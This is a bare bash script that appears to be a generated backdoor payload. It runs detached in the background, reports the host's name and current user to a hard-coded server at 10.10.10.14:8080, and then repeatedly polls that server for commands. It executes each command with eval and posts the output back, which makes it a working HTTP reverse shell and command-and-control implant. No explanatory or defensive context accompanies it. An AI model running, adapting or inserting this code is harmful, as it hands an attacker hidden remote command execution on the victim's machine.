#!/bin/bash
nohup bash -c 's=10.10.10.14:8080&&i=a53a76-92b22f-26892e&&hname=$(hostname)&&p=http://;curl -s "$p$s/a53a76/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/92b22f" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/26892e -X POST -H "Authorization: $i" -d "$r";echo $$;fi; fi; sleep 0.8; done;' & disown
